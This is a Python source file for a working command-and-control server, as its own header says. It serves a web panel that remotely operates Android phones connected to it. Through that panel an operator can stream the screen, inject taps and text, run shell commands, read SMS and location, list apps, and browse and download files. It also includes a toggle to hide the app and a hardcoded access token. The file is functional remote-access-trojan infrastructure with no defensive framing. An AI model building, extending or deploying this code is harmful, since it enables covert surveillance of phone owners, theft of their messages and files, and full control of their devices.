# server.py - C2 local, porta unica 8080 (v2)
import asyncio, json, socket
from aiohttp import web, WSMsgType

TOKEN = "3f7cm0ygvhr5w8"
DEVS = {}
VIEW = {}
BUSY = set()

def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]

PAGE = r"""<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>aval</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#0d0f12;color:#c9d1d9;font:12px/1.4 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;gap:5px;align-items:center;padding:5px 7px;background:#151a20;border-bottom:1px solid #232b35;flex-wrap:wrap}
main{flex:1;display:flex;min-height:0}
#wrap{flex:1;display:flex;flex-direction:column;min-width:0;background:#000}
#scr{flex:1;object-fit:contain;min-height:0;cursor:crosshair;user-select:none;-webkit-user-drag:none}
#bar,#foot{display:flex;gap:4px;padding:4px 6px;background:#151a20;flex-wrap:wrap}
#bar{border-top:1px solid #232b35}
aside{width:330px;display:flex;flex-direction:column;border-left:1px solid #232b35;background:#0f1318}
#tabs{display:flex;border-bottom:1px solid #232b35}
#tabs b{flex:1;text-align:center;padding:5px;cursor:pointer;font-weight:400;color:#6b7785;font-size:11px}
#tabs b.on{color:#58a6ff;border-bottom:2px solid #58a6ff}
#body{flex:1;overflow:auto;padding:5px}
#out{margin:0;font:11px monospace;white-space:pre-wrap;word-break:break-all}
button,select,input{background:#1d242c;color:#c9d1d9;border:1px solid #2f3944;padding:3px 6px;font-size:11px;border-radius:3px;cursor:pointer;font-family:inherit}
button:hover{background:#273039}
button.pri{background:#1f4d7a;border-color:#2a6ba8}
input{flex:1;cursor:text}
.ln{display:flex;gap:4px;align-items:center;margin-bottom:4px}
.sm{font:10px monospace;color:#6b7785}
#st{padding:2px 7px;font:11px monospace;color:#f0883e;min-height:14px}
.dot{width:7px;height:7px;border-radius:50%;background:#484f58;display:inline-block}
.dot.on{background:#3fb950}.dot.warn{background:#d29922}
.row{display:flex;justify-content:space-between;gap:6px;padding:2px 0;border-bottom:1px solid #1a2028;cursor:pointer}
.row:hover{background:#161c23}
</style>
<header>
<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span>
<span id=lat class=sm>--</span>
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button class=pri onclick="c('shot',{on:true})">Print ON</button><button onclick="c('shot',{on:false})">OFF</button>
<button onclick="c('screen',{on:true})">Acordar</button>
<button onclick="c('info')">Info</button><button onclick="c('apps')">Apps</button>
<button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
<button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
<button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
<button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
</header>
<main><div id=wrap><img id=scr><div id=st></div></div>
<aside>
<div id=tabs><b class=on data-t=log>log</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
<div id=body>
<div id=arqbar style="display:none"><div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div></div>
<pre id=out></pre>
</div>
<div style="padding:5px;border-top:1px solid #232b35">
<div class=ln>Q<input id=q type=range min=15 max=90 value=40 oninput="c('q',{v:+this.value})"></div>
<div class=ln>FPS<input id=f type=range min=1 max=15 value=4 oninput="c('fps',{v:+this.value})"></div>
<div class=ln>Res<input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
</div>
</aside></main>
<div id=bar><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path"><button class=pri onclick="send()">Enviar</button>
<button onclick="k(66)">Enter</button><button onclick="k(67)">Del</button><button onclick="k(26)">Notif</button>
<button onclick="c('clip')">Clip</button><button onclick="c('recon')">Reconectar</button></div>
<script>
const T=new URLSearchParams(location.search).get('t')||'';
const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),out=$('#out');
let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard';
const log=x=>{out.textContent+=x+'\n';out.scrollTop=out.scrollHeight};
function co(){
  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
  w.binaryType='arraybuffer';
  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
  w.onmessage=e=>{
    if(typeof e.data!=='string'){frame(e.data);return}
    const m=JSON.parse(e.data);
    if(m.k==='devs'){
      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
      return}
    if(m.k==='log'){
      const x=m.d;
      if(x.t==='hello'){inf=x;log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
        if(!sel&&x.id){dev.value=x.id;pick()}}
      else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
      else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
      else if(x.t==='ka'){}
      else if(x.t==='apps'&&tabNow==='apps'){out.textContent=x.o;out.scrollTop=0}
      else if(x.t==='ls'){lista(x.o)}
      else if(x.t==='dl'){baixa(x.o)}
      else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
      else log(x.t+': '+(x.o||''))}
  };
}
function frame(d){
  lf=Date.now();st.textContent='';
  const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null};i.src=u;
  if(recs&&recs.cv){recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
}
setInterval(()=>{
  if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
  else if(!lf||Date.now()-lf>2500){st.textContent='sem frames';dot.className='dot warn'}
  else dot.className='dot on'},1000);
function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
  if(sel&&w&&w.readyState===1)w.send(JSON.stringify({c:'sel',id:sel}))}
dev.onchange=pick;
function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
function k(n){c('key',{code:n})}
function send(){const e=$('#t'),v=e.value;if(!v)return;
  if(v[0]==='$')c('shell',{cmd:v.slice(1)});
  else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
  else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
  else c('text',{s:v});e.value=''}
$('#t').onkeydown=e=>{if(e.key==='Enter')send()};
function pt(e){const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
  return{x:Math.round((e.clientX-r.left)*nx/r.width*(inf.w?inf.w/nx:1)),
         y:Math.round((e.clientY-r.top)*ny/r.height*(inf.h?inf.h/ny:1))}}
let dn=null,t0=0;
i.onmousedown=e=>{dn=pt(e);t0=Date.now()};
i.onmouseup=e=>{if(!dn)return;const u=pt(e),m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
  if(m<12&&Date.now()-t0>600)c('long',{x:u.x,y:u.y});
  else if(m<12)c('touch',{x:u.x,y:u.y});
  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:260});dn=null};
function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
function rec(){
  if(recs){recs.stop();recs=null;st.textContent='';return}
  const cv=document.createElement('canvas');
  cv.width=i.naturalWidth||540;cv.height=i.naturalHeight||960;
  const r=new MediaRecorder(cv.captureStream(6),{mimeType:'video/webm'});
  r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);
    a.download='sessao.webm';a.click()};
  r.start();r.cv=cv;recs=r;st.textContent='gravando'}
function tab(n){tabNow=n;
  document.querySelectorAll('#tabs b').forEach(b=>b.classList.toggle('on',b.dataset.t===n));
  $('#arqbar').style.display=n==='arq'?'block':'none';
  out.style.display=n==='arq'?'none':'block';
  if(n==='apps')c('apps');if(n==='arq')ls();if(n==='info')c('info')}
document.querySelectorAll('#tabs b').forEach(b=>b.onclick=()=>tab(b.dataset.t));
function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
function lista(o){
  const f=$('#flist');f.innerHTML='';
  if(!o||o.startsWith('err')||o.startsWith('sem acesso')){f.textContent=o||'vazio';return}
  o.split('\n').forEach(l=>{
    if(!l||l.indexOf('\t')<0)return;
    const dir=l[0]==='d',nome=l.split('\t')[1];
    const d=document.createElement('div');d.className='row';
    d.innerHTML='<span>'+(dir?'[ ] ':'')+nome+'</span><span class=sm>'+(dir?'':l.split('\t')[0].slice(2))+'</span>';
    d.onclick=()=>{const base=pasta.endsWith('/')?pasta:pasta+'/';
      if(dir){$('#p').value=base+nome+'/';ls()}else c('dl',{p:base+nome})};
    f.appendChild(d)});
}
function baixa(o){
  const m=o.match(/b64=([\s\S]*)/);
  if(!m){log(o);return}
  const bin=atob(m[1].replace(/\s/g,'')),u=new Uint8Array(bin.length);
  for(let x=0;x<bin.length;x++)u[x]=bin.charCodeAt(x);
  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([u]));
  a.download=(pasta.split('/').pop()||'arq');a.click();log('baixado')
}
co();
</script>"""

def ok(req):
    return req.query.get("t") == TOKEN

async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try: await v.send_str(d)
        except Exception: pass

async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try: await v.send_bytes(data)
        except Exception: pass
        finally: BUSY.discard(v)

async def devs():
    await bcast({"k": "devs", "d": devlist()})

async def index(req):
    if not ok(req): raise web.HTTPFound("/?t=" + TOKEN)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")

async def phone(req):
    if not ok(req): return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev: await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try: o = json.loads(m.data)
                except Exception: o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try: await ws.send_str('{"c":"ka"}')
                    except Exception: pass
                    continue
                await bcast({"k": "log", "d": o}, dev)
    except Exception as e:
        print("  ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws

async def panel(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    VIEW[ws] = None
    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT: continue
            try: o = json.loads(m.data)
            except Exception: continue
            if o.get("c") == "sel":
                VIEW[ws] = o.get("id") or None
                alvo = DEVS.get(VIEW[ws])
                if alvo:
                    try:
                        await alvo["ws"].send_str('{"c":"shot","on":true}')
                        await alvo["ws"].send_str('{"c":"info"}')
                    except Exception: pass
                continue
            alvo = DEVS.get(o.get("id") or VIEW[ws])
            if not alvo:
                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id") or VIEW[ws]
            try: await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception: pass
    except Exception: pass
    finally: VIEW.pop(ws, None)
    return ws

async def health(req):
    return web.json_response({"ok": True, "devices": devlist()})

def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9)); return s.getsockname()[0]
    except Exception: return "127.0.0.1"
    finally: s.close()

async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e); return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)

async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())

def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.on_startup.append(on_start)
    print("painel: http://localhost:8080/")
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)

main()